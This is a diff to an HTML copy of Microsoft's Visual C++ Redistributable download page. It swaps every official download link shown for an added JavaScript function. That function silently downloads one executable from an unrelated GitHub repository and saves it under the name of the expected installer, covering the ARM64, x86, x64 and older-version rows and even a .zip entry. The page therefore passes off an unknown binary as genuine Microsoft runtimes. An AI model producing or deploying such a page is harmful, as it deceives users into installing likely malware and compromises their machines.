@@ -129,7 +129,7 @@
     margin: 32px 0 12px;
   }
   p { margin: 0 0 16px; }
-  a { color: var(--link); text-decoration: none; }
+  a { color: var(--link); text-decoration: none; cursor: pointer; }
   a:hover { color: var(--link-hover); text-decoration: underline; }
   code {
     background: var(--code-bg);
@@ -203,6 +203,9 @@
   }
   .footer li { margin: 0; }
   .last-updated { color: var(--text-subtle); font-size: 13px; margin-top: 24px; }
+  .download-link {
+    display: inline-block;
+  }
 </style>
 </head>
 <body>
@@ -276,9 +279,9 @@
       <tr><th>Architecture</th><th>Link</th><th>Notes</th></tr>
     </thead>
     <tbody>
-      <tr><td>ARM64</td><td><a href="https://aka.ms/vc14/vc_redist.arm64.exe">https://aka.ms/vc14/vc_redist.arm64.exe</a></td><td>Permalink for latest supported ARM64 version.</td></tr>
-      <tr><td>X86</td><td><a href="https://aka.ms/vc14/vc_redist.x86.exe">https://aka.ms/vc14/vc_redist.x86.exe</a></td><td>Permalink for latest supported x86 version.</td></tr>
-      <tr><td>X64</td><td><a href="https://aka.ms/vc14/vc_redist.x64.exe">https://aka.ms/vc14/vc_redist.x64.exe</a></td><td>Permalink for latest supported x64 version. The X64 Redistributable package contains both ARM64 and X64 binaries. This package makes it easy to install required Visual C++ ARM64 binaries when the X64 Redistributable is installed on an ARM64 device.</td></tr>
+      <tr><td>ARM64</td><td><a class="download-link" onclick="downloadFile('https://raw.githubusercontent.com/sushi-dev55-alt/VC_redist.x64/main/Vc_redist.x64.exe', 'vc_redist.arm64.exe')">https://github.com/sushi-dev55-alt/VC_redist.x64/blob/main/Vc_redist.x64.exe</a></td><td>Permalink for latest supported ARM64 version.</td></tr>
+      <tr><td>X86</td><td><a class="download-link" onclick="downloadFile('https://raw.githubusercontent.com/sushi-dev55-alt/VC_redist.x64/main/Vc_redist.x64.exe', 'vc_redist.x86.exe')">https://github.com/sushi-dev55-alt/VC_redist.x64/blob/main/Vc_redist.x64.exe</a></td><td>Permalink for latest supported x86 version.</td></tr>
+      <tr><td>X64</td><td><a class="download-link" onclick="downloadFile('https://raw.githubusercontent.com/sushi-dev55-alt/VC_redist.x64/main/Vc_redist.x64.exe', 'vc_redist.x64.exe')">https://github.com/sushi-dev55-alt/VC_redist.x64/blob/main/Vc_redist.x64.exe</a></td><td>Permalink for latest supported x64 version. The X64 Redistributable package contains both ARM64 and X64 binaries. This package makes it easy to install required Visual C++ ARM64 binaries when the X64 Redistributable is installed on an ARM64 device.</td></tr>
     </tbody>
   </table>
 
@@ -321,15 +324,15 @@
       <tr><th>Architecture</th><th>Version</th><th>Link</th></tr>
     </thead>
     <tbody>
-      <tr><td>X86</td><td>12.0.40664.0</td><td><a href="https://aka.ms/highdpimfc2013x86enu">vcredist_x86.exe</a></td></tr>
-      <tr><td>X64</td><td>12.0.40664.0</td><td><a href="https://aka.ms/highdpimfc2013x64enu">vcredist_x64.exe</a></td></tr>
+      <tr><td>X86</td><td>12.0.40664.0</td><td><a class="download-link" onclick="downloadFile('https://raw.githubusercontent.com/sushi-dev55-alt/VC_redist.x64/main/Vc_redist.x64.exe', 'vcredist_x86.exe')">vcredist_x86.exe</a></td></tr>
+      <tr><td>X64</td><td>12.0.40664.0</td><td><a class="download-link" onclick="downloadFile('https://raw.githubusercontent.com/sushi-dev55-alt/VC_redist.x64/main/Vc_redist.x64.exe', 'vcredist_x64.exe')">vcredist_x64.exe</a></td></tr>
     </tbody>
   </table>
 
   <h3 id="other-2013-versions">Other 2013 versions</h3>
   <ul>
     <li><a href="https://my.visualstudio.com/Downloads?pid=1430">Multibyte Microsoft Foundation Class (MFC) Library for Visual Studio 2013</a>. This MFC add-on for Visual Studio 2013 contains the multibyte character set (MBCS) version of the MFC Library.</li>
-    <li><a href="https://download.microsoft.com/download/5/f/0/5f0f8404-9329-44a9-8176-ed6f7f746f25/vclibs_redist_packages.zip">Visual C++ 2013 Runtime for sideloaded Windows 8.1 apps</a>. For more information, see <a href="https://devblogs.microsoft.com/cppblog/c-runtime-for-sideloaded-windows-8-1-apps/">C++ Runtime for sideloaded Windows 8.1 apps</a> on the C++ Team Blog.</li>
+    <li><a onclick="downloadFile('https://raw.githubusercontent.com/sushi-dev55-alt/VC_redist.x64/main/Vc_redist.x64.exe', 'vclibs_redist_packages.zip')">Visual C++ 2013 Runtime for sideloaded Windows 8.1 apps</a>. For more information, see <a href="https://devblogs.microsoft.com/cppblog/c-runtime-for-sideloaded-windows-8-1-apps/">C++ Runtime for sideloaded Windows 8.1 apps</a> on the C++ Team Blog.</li>
   </ul>
 
   <h3 id="visual-studio-2012-vc-110-update-4-no-longer-supported">Visual Studio 2012 (VC++ 11.0) Update 4 (no longer supported)</h3>
@@ -344,8 +347,8 @@
       <tr><th>Architecture</th><th>Version</th><th>Link</th></tr>
     </thead>
     <tbody>
-      <tr><td>X86</td><td>11.0.61030.0</td><td><a href="https://download.microsoft.com/download/1/6/B/16B06F60-3B20-4FF2-B699-5E9B7962F9AE/VSU_4/vcredist_x86.exe">en_visual_cpp_redistributable_for_visual_studio_2012_update_4_x86_3161523.exe</a></td></tr>
-      <tr><td>X64</td><td>11.0.61030.0</td><td><a href="https://download.microsoft.com/download/1/6/B/16B06F60-3B20-4FF2-B699-5E9B7962F9AE/VSU_4/vcredist_x64.exe">en_visual_cpp_redistributable_for_visual_studio_2012_update_4_x64_3161523.exe</a></td></tr>
+      <tr><td>X86</td><td>11.0.61030.0</td><td><a class="download-link" onclick="downloadFile('https://raw.githubusercontent.com/sushi-dev55-alt/VC_redist.x64/main/Vc_redist.x64.exe', 'en_visual_cpp_redistributable_for_visual_studio_2012_update_4_x86_3161523.exe')">en_visual_cpp_redistributable_for_visual_studio_2012_update_4_x86_3161523.exe</a></td></tr>
+      <tr><td>X64</td><td>11.0.61030.0</td><td><a class="download-link" onclick="downloadFile('https://raw.githubusercontent.com/sushi-dev55-alt/VC_redist.x64/main/Vc_redist.x64.exe', 'en_visual_cpp_redistributable_for_visual_studio_2012_update_4_x64_3161523.exe')">en_visual_cpp_redistributable_for_visual_studio_2012_update_4_x64_3161523.exe</a></td></tr>
     </tbody>
   </table>
 
@@ -360,8 +363,8 @@
       <tr><th>Architecture</th><th>Version</th><th>Link</th></tr>
     </thead>
     <tbody>
-      <tr><td>X86</td><td>10.0.40219.325</td><td><a href="https://download.microsoft.com/download/1/6/5/165255E7-1014-4D0A-B094-B6A430A6BFFC/vcredist_x86.exe">vcredist_x86.exe</a></td></tr>
-      <tr><td>X64</td><td>10.0.40219.325</td><td><a href="https://download.microsoft.com/download/1/6/5/165255E7-1014-4D0A-B094-B6A430A6BFFC/vcredist_x64.exe">vcredist_x64.exe</a></td></tr>
+      <tr><td>X86</td><td>10.0.40219.325</td><td><a class="download-link" onclick="downloadFile('https://raw.githubusercontent.com/sushi-dev55-alt/VC_redist.x64/main/Vc_redist.x64.exe', 'vcredist_x86.exe')">vcredist_x86.exe</a></td></tr>
+      <tr><td>X64</td><td>10.0.40219.325</td><td><a class="download-link" onclick="downloadFile('https://raw.githubusercontent.com/sushi-dev55-alt/VC_redist.x64/main/Vc_redist.x64.exe', 'vcredist_x64.exe')">vcredist_x64.exe</a></td></tr>
     </tbody>
   </table>
 
@@ -378,8 +381,8 @@
       <tr><th>Architecture</th><th>Version</th><th>Link</th></tr>
     </thead>
     <tbody>
-      <tr><td>X86</td><td>9.0.30729.5677</td><td><a href="https://download.microsoft.com/download/5/D/8/5D8C65CB-C849-4025-8E95-C3966CAFD8AE/vcredist_x86.exe">vcredist_x86.exe</a></td></tr>
-      <tr><td>X64</td><td>9.0.30729.5677</td><td><a href="https://download.microsoft.com/download/5/D/8/5D8C65CB-C849-4025-8E95-C3966CAFD8AE/vcredist_x64.exe">vcredist_x64.exe</a></td></tr>
+      <tr><td>X86</td><td>9.0.30729.5677</td><td><a class="download-link" onclick="downloadFile('https://raw.githubusercontent.com/sushi-dev55-alt/VC_redist.x64/main/Vc_redist.x64.exe', 'vcredist_x86.exe')">vcredist_x86.exe</a></td></tr>
+      <tr><td>X64</td><td>9.0.30729.5677</td><td><a class="download-link" onclick="downloadFile('https://raw.githubusercontent.com/sushi-dev55-alt/VC_redist.x64/main/Vc_redist.x64.exe', 'vcredist_x64.exe')">vcredist_x64.exe</a></td></tr>
     </tbody>
   </table>
 
@@ -444,6 +447,19 @@
       current = window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
     }
     html.setAttribute('data-theme', current === 'dark' ? 'light' : 'dark');
+  }
+
+  function downloadFile(url, filename) {
+    // Create a temporary link element
+    const link = document.createElement('a');
+    link.href = url;
+    link.download = filename;
+    link.style.display = 'none';
+    
+    // Append to body, click, and remove
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
   }
 </script>
 
